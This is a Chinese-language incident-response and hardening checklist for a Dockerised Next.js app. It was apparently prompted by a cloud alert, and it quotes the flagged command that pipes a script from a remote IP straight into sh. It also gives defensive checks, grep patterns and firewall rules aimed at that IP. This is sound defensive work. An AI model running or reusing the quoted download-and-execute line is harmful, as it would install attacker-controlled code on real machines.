# 安全加固检查清单

## 🚨 当前安全告警分析

根据云服务器厂商的安全告警，检测到恶意命令：
```
sh -c curl -fsSL http://121.188.197.14/js/l.txt |sh
```

该命令从 `next-server` 进程触发，可能的原因：
1. **供应链攻击**：某个 npm 包的 postinstall/preinstall 脚本被感染
2. **镜像被感染**：构建的 Docker 镜像被植入了恶意代码
3. **运行时注入**：某个依赖在运行时执行了恶意脚本

## ✅ 已实施的安全加固措施

### 1. 容器安全配置（deploy.sh）
- ✅ 使用非 root 用户运行（UID 1000）
- ✅ 禁止获取新权限（no-new-privileges）
- ✅ 移除所有 Linux 能力，仅保留必要能力
- ✅ 内存限制（2GB）
- ✅ CPU 限制（2 核）
- ✅ 进程数限制（100 个进程）
- ✅ 文件描述符限制

### 2. 镜像安全配置（Dockerfile）
- ✅ 创建非 root 用户（appuser）
- ✅ 最小化安装（--no-install-recommends）
- ✅ 清理临时文件和缓存
- ✅ 使用非 root 用户运行应用

## 🔍 紧急排查步骤

### 步骤 1：立即停止并检查当前容器

```bash
# 停止当前运行的容器
docker stop stock-scope

# 检查容器内的可疑进程和文件
docker exec stock-scope ps aux
docker exec stock-scope netstat -tulpn
docker exec stock-scope find /app -name "*.sh" -o -name "*.js" | xargs grep -l "121.188.197.14"
```

### 步骤 2：检查 npm 依赖包

```bash
# 进入容器检查
docker exec -it stock-scope sh

# 检查 package.json 中的 postinstall/preinstall 脚本
cd /app/frontend
cat package.json | grep -A 5 -B 5 "postinstall\|preinstall"

# 检查 node_modules 中是否有可疑脚本
find node_modules -name "*.sh" -o -name "postinstall.js" -o -name "preinstall.js"
```

### 步骤 3：检查镜像完整性

```bash
# 检查镜像层
docker history crpi-3f383vugjtqlop7w.cn-guangzhou.personal.cr.aliyuncs.com/fishisnow/stock-scope:latest

# 导出镜像内容检查
docker save crpi-3f383vugjtqlop7w.cn-guangzhou.personal.cr.aliyuncs.com/fishisnow/stock-scope:latest -o image.tar
tar -tf image.tar | grep -E "\.sh$|\.js$" | head -20
```

### 步骤 4：重新构建干净的镜像

```bash
# 1. 清理本地镜像
docker rmi crpi-3f383vugjtqlop7w.cn-guangzhou.personal.cr.aliyuncs.com/fishisnow/stock-scope:latest

# 2. 检查源代码是否有被篡改
git status
git diff

# 3. 重新构建镜像（使用本地 Dockerfile）
docker build -t stock-scope:latest .

# 4. 测试运行
docker run --rm -it stock-scope:latest sh
# 在容器内检查是否有可疑进程或脚本

# 5. 推送到阿里云（如果测试通过）
# 参考 push_to_aliyun.sh
```

## 🛡️ 预防措施

### 1. 依赖包安全检查

定期检查 npm 依赖包的安全性：

```bash
# 安装 npm audit 工具
npm install -g npm-audit-resolver

# 检查依赖漏洞
cd frontend
npm audit
npm audit fix

# 检查依赖包的 postinstall 脚本
npm list --depth=0 | while read pkg; do
  npm view $pkg scripts 2>/dev/null | grep -E "postinstall|preinstall"
done
```

### 2. 镜像安全扫描

```bash
# 使用 Trivy 扫描镜像（推荐）
# 安装：https://github.com/aquasecurity/trivy
trivy image crpi-3f383vugjtqlop7w.cn-guangzhou.personal.cr.aliyuncs.com/fishisnow/stock-scope:latest

# 或使用 Docker Scout（Docker Desktop 内置）
docker scout cves crpi-3f383vugjtqlop7w.cn-guangzhou.personal.cr.aliyuncs.com/fishisnow/stock-scope:latest
```

### 3. 运行时监控

设置进程和网络监控：

```bash
# 监控容器内的进程
docker exec stock-scope ps aux | grep -v "\["

# 监控容器网络连接
docker exec stock-scope netstat -tulpn

# 设置定期检查脚本
cat > /usr/local/bin/check-container.sh << 'EOF'
#!/bin/bash
CONTAINER="stock-scope"
SUSPICIOUS_IPS=("121.188.197.14")

for ip in "${SUSPICIOUS_IPS[@]}"; do
    if docker exec $CONTAINER netstat -tn 2>/dev/null | grep -q "$ip"; then
        echo "⚠️  警告：检测到可疑网络连接 $ip"
        docker exec $CONTAINER netstat -tn | grep "$ip"
    fi
done
EOF
chmod +x /usr/local/bin/check-container.sh

# 添加到 crontab（每 5 分钟检查一次）
# crontab -e
# */5 * * * * /usr/local/bin/check-container.sh >> /var/log/container-check.log 2>&1
```

### 4. 使用只读文件系统（可选，需要测试）

如果应用不需要写入文件系统，可以使用只读模式：

```bash
# 在 deploy.sh 中添加（需要先测试应用是否正常工作）
# --read-only \
# --tmpfs /tmp \
# --tmpfs /app/frontend/.next \
```

### 5. 网络隔离

限制容器的网络访问：

```bash
# 创建自定义网络，限制出站连接
docker network create --driver bridge --opt com.docker.network.bridge.enable_icc=false stock-scope-net

# 或使用防火墙规则
# iptables -A DOCKER -s <container_ip> -d 121.188.197.14 -j DROP
```

## 📋 定期安全检查清单

- [ ] 每周运行 `npm audit` 检查依赖漏洞
- [ ] 每月扫描 Docker 镜像安全漏洞
- [ ] 定期检查容器内的进程和网络连接
- [ ] 监控容器资源使用情况（CPU、内存、网络）
- [ ] 检查日志中是否有异常活动
- [ ] 定期更新基础镜像（node:20-slim, python:3.12-slim）
- [ ] 审查新添加的 npm 包的安全性
- [ ] 使用 `npm ci` 而不是 `npm install`（确保依赖版本锁定）

## 🔐 最佳实践

1. **最小权限原则**：容器只拥有运行所需的最小权限
2. **非 root 用户**：始终使用非 root 用户运行应用
3. **依赖锁定**：使用 `package-lock.json` 锁定依赖版本
4. **镜像扫描**：构建后扫描镜像安全漏洞
5. **网络隔离**：限制容器的不必要网络访问
6. **资源限制**：设置 CPU、内存等资源限制
7. **日志监控**：定期检查容器日志
8. **定期更新**：及时更新依赖包和基础镜像

## 🆘 如果发现恶意活动

1. **立即停止容器**
   ```bash
   docker stop stock-scope
   ```

2. **保存证据**
   ```bash
   docker export stock-scope -o container-export.tar
   docker logs stock-scope > container-logs.txt
   ```

3. **检查主机系统**
   ```bash
   # 检查是否有其他可疑进程
   ps aux | grep -E "curl|wget|sh -c"
   netstat -tulpn | grep -E "121.188.197.14"
   ```

4. **清理和重建**
   - 删除受感染的容器和镜像
   - 从干净的源代码重新构建
   - 更新所有依赖包

5. **通知相关人员**
   - 报告安全事件
   - 检查是否有数据泄露
   - 考虑重置相关密钥和凭证

## 📞 联系信息

如发现安全问题，请立即：
- 停止受影响的服务
- 保存相关日志和证据
- 联系安全团队

